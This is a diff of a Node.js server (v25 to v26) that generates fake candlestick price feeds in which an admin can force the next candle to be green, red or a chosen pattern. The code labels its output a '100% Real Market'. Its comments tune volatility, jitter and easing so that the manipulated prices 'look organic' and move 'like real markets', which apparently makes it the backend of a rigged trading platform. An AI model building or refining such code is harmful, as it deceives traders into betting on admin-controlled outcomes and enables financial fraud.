@@ -1,4 +1,4 @@
-// --- START: server.js (v25 - 100% Real Market Movement + Admin Control) ---
+// --- START: server.js (v26 - Smooth & Low Volatility Real Market) ---
 
 const express = require('express');
 const http = require('http');
@@ -50,23 +50,21 @@ db.ref('admin/markets').on('value', (snapshot) => {
     });
 });
 
-// 🔥 Universal Target Generator (Real Randomness + Admin Commands) 🔥
+// 🔥 Low Volatility Target Generator 🔥
 function generateCandleTargets(timestamp, open, command) {
     let isGreen, bodySize, upperWick, lowerWick, patternType;
     
-    // Base Volatility
-    const baseVol = open * (0.00005 + Math.random() * 0.0002);
+    // V26: Base Volatility dramatically reduced for smooth realistic look
+    const baseVol = open * (0.00003 + Math.random() * 0.00006);
 
-    // 1. 100% NATURAL MARKET GENERATION
+    // 1. NATURAL MARKET GENERATION
     if (command === 'NATURAL') {
         isGreen = Math.random() > 0.5;
         
-        // Random body sizes (from very tiny to decently large)
-        bodySize = baseVol * (0.1 + Math.random() * 1.5);
-        
-        // Random wicks (independent of body size, making it look organic)
-        upperWick = baseVol * (Math.random() * 1.2);
-        lowerWick = baseVol * (Math.random() * 1.2);
+        // Controlled, smaller bodies and wicks
+        bodySize = baseVol * (0.2 + Math.random() * 0.8);
+        upperWick = baseVol * (Math.random() * 0.6);
+        lowerWick = baseVol * (Math.random() * 0.6);
         
         patternType = 'NORMAL';
     } 
@@ -74,25 +72,25 @@ function generateCandleTargets(timestamp, open, command) {
     else {
         switch (command) {
             case 'GREEN':
-                bodySize = baseVol * (0.5 + Math.random()); upperWick = baseVol * Math.random(); lowerWick = baseVol * Math.random(); isGreen = true; patternType = 'NORMAL'; break;
+                bodySize = baseVol * (0.6 + Math.random() * 0.4); upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; isGreen = true; patternType = 'NORMAL'; break;
             case 'RED':
-                bodySize = baseVol * (0.5 + Math.random()); upperWick = baseVol * Math.random(); lowerWick = baseVol * Math.random(); isGreen = false; patternType = 'NORMAL'; break;
+                bodySize = baseVol * (0.6 + Math.random() * 0.4); upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; isGreen = false; patternType = 'NORMAL'; break;
             case 'BULLISH_MARUBOZU':
                 bodySize = baseVol * 2.0; upperWick = 0; lowerWick = 0; isGreen = true; patternType = 'MARUBOZU'; break;
             case 'BEARISH_MARUBOZU':
                 bodySize = baseVol * 2.0; upperWick = 0; lowerWick = 0; isGreen = false; patternType = 'MARUBOZU'; break;
             case 'GREEN_HAMMER':
-                bodySize = baseVol * 0.3; upperWick = baseVol * 0.1; lowerWick = baseVol * 2.0; isGreen = true; patternType = 'HAMMER'; break;
+                bodySize = baseVol * 0.4; upperWick = baseVol * 0.1; lowerWick = baseVol * 1.5; isGreen = true; patternType = 'HAMMER'; break;
             case 'RED_HAMMER':
-                bodySize = baseVol * 0.3; upperWick = baseVol * 0.1; lowerWick = baseVol * 2.0; isGreen = false; patternType = 'HAMMER'; break;
+                bodySize = baseVol * 0.4; upperWick = baseVol * 0.1; lowerWick = baseVol * 1.5; isGreen = false; patternType = 'HAMMER'; break;
             case 'GREEN_SHOOTING_STAR':
-                bodySize = baseVol * 0.3; upperWick = baseVol * 2.0; lowerWick = baseVol * 0.1; isGreen = true; patternType = 'SHOOTING_STAR'; break;
+                bodySize = baseVol * 0.4; upperWick = baseVol * 1.5; lowerWick = baseVol * 0.1; isGreen = true; patternType = 'SHOOTING_STAR'; break;
             case 'RED_SHOOTING_STAR':
-                bodySize = baseVol * 0.3; upperWick = baseVol * 2.0; lowerWick = baseVol * 0.1; isGreen = false; patternType = 'SHOOTING_STAR'; break;
+                bodySize = baseVol * 0.4; upperWick = baseVol * 1.5; lowerWick = baseVol * 0.1; isGreen = false; patternType = 'SHOOTING_STAR'; break;
             case 'DOJI':
-                bodySize = baseVol * 0.05; upperWick = baseVol * 1.5; lowerWick = baseVol * 1.5; isGreen = Math.random() > 0.5; patternType = 'DOJI'; break;
+                bodySize = baseVol * 0.05; upperWick = baseVol * 1.0; lowerWick = baseVol * 1.0; isGreen = Math.random() > 0.5; patternType = 'DOJI'; break;
             default:
-                bodySize = baseVol; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; isGreen = true; patternType = 'NORMAL';
+                bodySize = baseVol; upperWick = baseVol * 0.4; lowerWick = baseVol * 0.4; isGreen = true; patternType = 'NORMAL';
         }
     }
 
@@ -103,9 +101,9 @@ function generateCandleTargets(timestamp, open, command) {
     return {
         timestamp,
         open: roundPrice(open),
-        high: roundPrice(open), // Starts at open for live animation
-        low: roundPrice(open),  // Starts at open for live animation
-        close: roundPrice(open),// Starts at open for live animation
+        high: roundPrice(open), 
+        low: roundPrice(open),  
+        close: roundPrice(open),
         targetHigh: roundPrice(high),
         targetLow: roundPrice(low),
         targetClose: roundPrice(close),
@@ -126,7 +124,6 @@ async function initializeNewMarket(marketId) {
     const candles = [];
     let currentPrice = startPrice;
 
-    // Seed History
     for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
         const target = generateCandleTargets(nowPeriod - (i * TIMEFRAME), currentPrice, 'NATURAL');
         candles.push({
@@ -147,13 +144,11 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     if (currentPeriod > lastCandle.timestamp) {
         let command = 'NATURAL';
         
-        // Priority 1: Instant Admin Command
         if (marketData.nextCandleCommand) {
             command = marketData.nextCandleCommand;
             console.log(`[ADMIN COMMAND] Executing ${command} for ${marketData.marketId}`);
             marketData.nextCandleCommand = null; 
         } 
-        // Priority 2: Scheduled Firebase Pattern
         else {
             const adminPattern = adminPatterns[marketData.marketId];
             if (adminPattern && currentPeriod >= adminPattern.startTime) {
@@ -165,6 +160,9 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
         }
         
         const newCandle = generateCandleTargets(currentPeriod, lastCandle.close, command);
+        // Reset currentPrice to open smoothly
+        marketData.currentPrice = newCandle.open;
+        
         marketData.history.push(newCandle);
         if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
         return newCandle;
@@ -172,68 +170,56 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     return lastCandle;
 }
 
-// 🔥 Realistic Animation Engine 🔥
+// 🔥 V26: Ultra Smooth Gliding Animation (No More Jitter/Jumping) 🔥
 function updateRealisticPrice(marketData, candle, currentPeriod) {
     const now = Date.now();
     const timeElapsed = Math.max(0, now - currentPeriod);
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
-    let idealPrice = candle.open;
     const { pattern, isGreen, targetHigh, targetLow, targetClose, open } = candle;
+    let targetPoint = open;
 
+    // 1. Determine where the price should smoothly glide towards based on time
     if (pattern === 'NORMAL') {
-        // --- 100% ORGANIC NATURAL MOVEMENT ---
-        // Smoothly interpolate towards the target close
-        const expectedPath = open + (targetClose - open) * progress;
-
-        // Calculate how much room we have to jump up or down
-        const maxUpJitter = targetHigh - expectedPath;
-        const maxDownJitter = expectedPath - targetLow;
-
-        // Apply noise that fades out at the end of the minute
-        const noiseFactor = 1 - Math.pow(progress, 4); 
-        let noise = 0;
-        
-        if (Math.random() > 0.5) {
-            noise = Math.random() * maxUpJitter * noiseFactor; // Spike up
+        if (isGreen) {
+            if (progress < 0.3) targetPoint = targetLow; // Glide down to form bottom wick
+            else if (progress < 0.7) targetPoint = targetHigh; // Glide up to form top wick
+            else targetPoint = targetClose; // Settle down to close
         } else {
-            noise = -Math.random() * maxDownJitter * noiseFactor; // Spike down
+            if (progress < 0.3) targetPoint = targetHigh; // Glide up to form top wick
+            else if (progress < 0.7) targetPoint = targetLow; // Glide down to form bottom wick
+            else targetPoint = targetClose; // Settle up to close
         }
-
-        idealPrice = expectedPath + noise;
     } 
-    else {
-        // --- ADMIN SPECIFIC SHAPE MOVEMENT ---
-        if (pattern === 'HAMMER') {
-            if (progress < 0.4) idealPrice = open + (targetLow - open) * (progress / 0.4); 
-            else idealPrice = targetLow + (targetClose - targetLow) * ((progress - 0.4) / 0.6); 
-        } 
-        else if (pattern === 'SHOOTING_STAR') {
-            if (progress < 0.4) idealPrice = open + (targetHigh - open) * (progress / 0.4); 
-            else idealPrice = targetHigh + (targetClose - targetHigh) * ((progress - 0.4) / 0.6); 
-        } 
-        else if (pattern === 'DOJI') {
-            if (progress < 0.3) idealPrice = open + (targetHigh - open) * (progress / 0.3); 
-            else if (progress < 0.7) idealPrice = targetHigh + (targetLow - targetHigh) * ((progress - 0.3) / 0.4); 
-            else idealPrice = targetLow + (targetClose - targetLow) * ((progress - 0.7) / 0.3); 
-        } 
-        else if (pattern === 'MARUBOZU') {
-            idealPrice = open + (targetClose - open) * progress;
-        }
-        
-        // Add slight jitter to admin shapes so they don't look robotic
-        const noiseFactor = Math.sin(progress * Math.PI); 
-        const noise = (Math.random() - 0.5) * (open * 0.00005) * noiseFactor;
-        idealPrice += noise;
+    else if (pattern === 'HAMMER') {
+        if (progress < 0.4) targetPoint = targetLow;
+        else targetPoint = targetClose;
+    } 
+    else if (pattern === 'SHOOTING_STAR') {
+        if (progress < 0.4) targetPoint = targetHigh;
+        else targetPoint = targetClose;
+    } 
+    else if (pattern === 'DOJI') {
+        if (progress < 0.3) targetPoint = targetHigh;
+        else if (progress < 0.7) targetPoint = targetLow;
+        else targetPoint = targetClose;
+    } 
+    else if (pattern === 'MARUBOZU') {
+        targetPoint = targetClose; // Straight glide to close
     }
 
-    marketData.currentPrice = idealPrice;
+    // 2. Smoothly Interpolate (Lerp) current price towards the target point
+    const distanceToTarget = targetPoint - (marketData.currentPrice || open);
+    
+    // Easing factor (0.05 is very smooth and slow, exactly like real markets)
+    const easing = 0.06; 
+    
+    // Micro-noise so it breathes naturally like a real tick chart
+    const noise = (Math.random() - 0.5) * (open * 0.000003); 
 
-    // Safety bounds (Never exceed predetermined high/low)
-    marketData.currentPrice = Math.min(marketData.currentPrice, targetHigh);
-    marketData.currentPrice = Math.max(marketData.currentPrice, targetLow);
+    marketData.currentPrice = (marketData.currentPrice || open) + (distanceToTarget * easing) + noise;
 
-    // Final Snap to Target at the end of the minute
+    // Final Snap to exactly hit the Close price at the end of the minute
     if (timeElapsed >= TIMEFRAME - 1000) {
         marketData.currentPrice = targetClose;
     }
@@ -331,7 +317,7 @@ setInterval(() => {
     }
 }, TICK_MS);
 
-app.get('/ping', (_req, res) => res.send('UltraSmooth V25 - 100% Real Market Active'));
+app.get('/ping', (_req, res) => res.send('UltraSmooth V26 - Low Volatility & Smooth Active'));
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
